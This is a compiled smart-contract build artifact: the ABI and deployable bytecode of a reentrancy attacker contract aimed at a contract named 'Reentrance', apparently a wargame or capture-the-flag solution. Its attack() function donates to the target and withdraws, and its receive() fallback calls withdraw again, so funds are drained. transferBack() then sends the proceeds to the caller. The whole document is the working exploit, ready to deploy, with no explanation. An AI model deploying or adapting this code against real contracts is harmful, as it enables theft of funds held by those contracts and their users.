{"abi":[{"type":"constructor","inputs":[{"name":"reentranceAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"balanceOfMe","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"reentrance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"},{"type":"function","name":"transferBack","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516103da3803806103da8339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610375806100656000396000f3fe6080604052600436106100425760003560e01c80622a3bb1146101305780630eb2b9c9146101615780631d7876e7146101885780639e5faafc1461019f5761012b565b3661012b5760008054604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b15801561009357600080fd5b505afa1580156100a7573d6000803e3d6000fd5b505050506040513d60208110156100bd57600080fd5b505190508015610128576000805460408051632e1a7d4d60e01b81526004810185905290516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561010f57600080fd5b505af1158015610123573d6000803e3d6000fd5b505050505b50005b600080fd5b34801561013c57600080fd5b506101456101a7565b604080516001600160a01b039092168252519081900360200190f35b34801561016d57600080fd5b506101766101b6565b60408051918252519081900360200190f35b34801561019457600080fd5b5061019d610233565b005b61019d610262565b6000546001600160a01b031681565b60008054604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b15801561020257600080fd5b505afa158015610216573d6000803e3d6000fd5b505050506040513d602081101561022c57600080fd5b5051905090565b60405133904780156108fc02916000818181858888f1935050505015801561025f573d6000803e3d6000fd5b50565b60008054604080517e362a9500000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b039092169262362a95923492602480820193929182900301818588803b1580156102c457600080fd5b505af11580156102d8573d6000803e3d6000fd5b50506000805460408051632e1a7d4d60e01b815234600482015290516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561032557600080fd5b505af1158015610339573d6000803e3d6000fd5b5050505056fea2646970667358221220174d0032d4944cb551a9d699562e1e122a54bc8f62cc9e8aa6745e66663ec50164736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","balanceOfMe()":"0eb2b9c9","reentrance()":"002a3bb1","transferBack()":"1d7876e7"},"id":1}